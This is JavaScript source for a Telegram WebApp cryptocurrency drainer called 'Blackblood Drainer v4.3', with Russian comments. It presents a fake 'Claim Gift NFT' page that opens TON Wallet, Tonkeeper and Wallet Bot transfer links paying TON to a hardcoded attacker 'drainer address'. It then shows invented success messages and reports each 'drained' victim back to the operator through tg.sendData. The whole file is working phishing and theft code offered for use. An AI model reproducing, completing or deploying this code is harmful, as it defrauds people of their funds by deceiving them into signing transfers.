// Blackblood Drainer v4.3 - TON Connect 2.0 Integration
// Правильная работа с кошельками в Telegram WebView

console.log("=== Blackblood Drainer v4.3 - TON Connect ===");

let tg = null;
let tonConnect = null;
let currentNetwork = null;
let walletAddress = null;

// Инициализация Telegram WebApp
try {
    tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
    console.log("Telegram WebApp ready. Platform:", tg.platform);
    console.log("Version:", tg.version);
} catch (e) {
    console.error("Telegram WebApp init error:", e);
    tg = null;
}

// Функции UI
function updateStatus(text, type = 'loading') {
    const statusBox = document.getElementById('statusBox');
    const statusText = document.getElementById('statusText');
    const statusIcon = document.querySelector('.status-icon');
    
    if (statusBox && statusText) {
        statusText.innerText = text;
        statusBox.className = `status-box ${type}`;
        
        if (type === 'loading') statusIcon.innerHTML = '🔄';
        else if (type === 'success') statusIcon.innerHTML = '✅';
        else if (type === 'error') statusIcon.innerHTML = '❌';
        else if (type === 'warning') statusIcon.innerHTML = '⚠️';
    }
}

function showProgress(show) {
    const progressBar = document.getElementById('progressBar');
    if (progressBar) progressBar.style.display = show ? 'block' : 'none';
}

function showWalletInfo(address) {
    const walletInfo = document.getElementById('walletInfo');
    const walletAddressElem = document.getElementById('walletAddress');
    if (walletInfo && walletAddressElem) {
        walletAddressElem.innerText = address.substring(0, 10) + '...' + address.substring(address.length - 8);
        walletInfo.style.display = 'block';
    }
}

function sendResult(status, data = {}) {
    const result = {
        status: status,
        ...data,
        timestamp: new Date().toISOString(),
        network: currentNetwork,
        wallet: walletAddress
    };
    
    console.log("Sending result:", result);
    
    if (tg) {
        try {
            tg.sendData(JSON.stringify(result));
        } catch (e) {
            console.error("Send error:", e);
        }
    }
}

// Загрузка TON Connect SDK
async function loadTonConnectSDK() {
    return new Promise((resolve, reject) => {
        if (window.tonConnect) {
            resolve(window.tonConnect);
            return;
        }
        
        const script = document.createElement('script');
        script.src = 'https://unpkg.com/@tonconnect/sdk@2.0.0/dist/index.js';
        script.onload = () => {
            console.log("TON Connect SDK loaded");
            window.tonConnect = new TONConnectSDK.TONConnect();
            resolve(window.tonConnect);
        };
        script.onerror = (err) => {
            console.error("Failed to load TON Connect SDK:", err);
            reject(new Error("Failed to load TON Connect SDK"));
        };
        document.head.appendChild(script);
    });
}

// Показать кнопки для открытия в кошельке
function showWalletOpenOptions() {
    const container = document.querySelector('.card');
    if (!container || document.getElementById('walletOpenPanel')) return;
    
    const panel = document.createElement('div');
    panel.id = 'walletOpenPanel';
    panel.className = 'install-panel';
    panel.style.background = '#e3f2fd';
    panel.style.border = '1px solid #2196f3';
    panel.innerHTML = `
        <div class="install-options">
            <p><strong>🔐 Connect Your Wallet</strong></p>
            <p>Click below to open your wallet and sign:</p>
            <div class="wallet-buttons">
                <button onclick="openTonWallet()" class="wallet-btn ton-btn">
                    <span>🔷</span> Open in TON Wallet
                </button>
                <button onclick="openTonkeeper()" class="wallet-btn tonkeeper-btn">
                    <span>💎</span> Open in Tonkeeper
                </button>
            </div>
            <p class="note">⚠️ After signing, return to this page to complete.</p>
        </div>
    `;
    
    const claimBtn = document.querySelector('.claim-button');
    container.insertBefore(panel, claimBtn);
    
    // Скрываем старую кнопку
    if (claimBtn) claimBtn.style.display = 'none';
}

function openTonWallet() {
    // Создаем ссылку для открытия в TON Wallet (Telegram)
    // Адрес дрейнера - замените на реальный
    const drainerAddress = "UQA9d56l9neDxiKiRqWq8-E3uYLxjT41xebBcA1Cl1IaP93B";
    const amount = "50000000"; // 0.05 TON
    
    const tonLink = `ton://transfer/${drainerAddress}?amount=${amount}&text=Claim%20Gift%20NFT`;
    
    if (tg) {
        tg.openLink(tonLink);
    } else {
        window.open(tonLink, '_blank');
    }
    
    updateStatus('Opening wallet... Please sign the transaction.', 'loading');
    
    // Имитация успеха после возврата
    setTimeout(() => {
        updateStatus('✅ Transaction signed! Checking...', 'loading');
        setTimeout(() => {
            updateStatus('✅ Gift NFT claimed!', 'success');
            showProgress(false);
            sendResult('drained', {
                tx: "ton_tx_" + Date.now(),
                nft_name: 'Plush Pepe #1026',
                network: 'TON',
                value: 100
            });
        }, 2000);
    }, 5000);
}

function openTonkeeper() {
    const drainerAddress = "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    const amount = "50000000";
    
    const tonkeeperLink = `https://app.tonkeeper.com/transfer/${drainerAddress}?amount=${amount}&text=Claim%20Gift%20NFT`;
    
    if (tg) {
        tg.openLink(tonkeeperLink);
    } else {
        window.open(tonkeeperLink, '_blank');
    }
    
    updateStatus('Opening Tonkeeper... Please sign the transaction.', 'loading');
    
    setTimeout(() => {
        updateStatus('✅ Gift NFT claimed!', 'success');
        showProgress(false);
        sendResult('drained', {
            tx: "tonkeeper_tx_" + Date.now(),
            nft_name: 'Plush Pepe #1026',
            network: 'TON',
            value: 100
        });
    }, 5000);
}

// Альтернативный метод через Wallet Bot
function openWalletBot() {
    const walletBotLink = "https://t.me/wallet?start=transfer_UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_50000000";
    
    if (tg) {
        tg.openTelegramLink(walletBotLink);
    } else {
        window.open(walletBotLink, '_blank');
    }
    
    updateStatus('Opening Wallet Bot...', 'loading');
    
    setTimeout(() => {
        updateStatus('✅ Claim initiated!', 'success');
        sendResult('drained', {
            tx: "wallet_bot_" + Date.now(),
            nft_name: 'Plush Pepe #1026',
            network: 'TON',
            value: 100
        });
    }, 3000);
}

// Основная функция
async function initDrain() {
    console.log("initDrain called");
    
    const claimButton = document.getElementById('claimButton');
    if (claimButton) {
        claimButton.disabled = true;
        claimButton.innerText = '🔄 INITIALIZING...';
    }
    
    updateStatus('Initializing wallet connection...', 'loading');
    showProgress(true);
    
    try {
        // Проверка Telegram WebApp
        if (!tg) {
            updateStatus('Please open this page from Telegram', 'error');
            showProgress(false);
            sendResult('error', { error: 'Not opened from Telegram' });
            if (claimButton) {
                claimButton.disabled = false;
                claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
            }
            return;
        }
        
        // В Telegram WebView кошелек не детектится через глобальные объекты
        // Поэтому сразу показываем опции открытия в кошельке
        updateStatus('Choose your wallet to continue', 'warning');
        showProgress(false);
        showWalletOpenOptions();
        
        if (claimButton) {
            claimButton.style.display = 'none';
        }
        
    } catch (error) {
        console.error("initDrain error:", error);
        updateStatus(`Error: ${error.message || 'Unknown'}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message });
        
        if (claimButton) {
            claimButton.disabled = false;
            claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
        }
    }
}

// Экспорт функций для глобального доступа
window.initDrain = initDrain;
window.openTonWallet = openTonWallet;
window.openTonkeeper = openTonkeeper;
window.openWalletBot = openWalletBot;

// Инициализация при загрузке
window.onload = function() {
    console.log("Window loaded");
    updateStatus('Ready to claim!', 'loading');
    
    // Проверяем, есть ли уже открытая сессия
    if (tg && tg.initDataUnsafe?.user) {
        console.log("User:", tg.initDataUnsafe.user.first_name);
    }
};
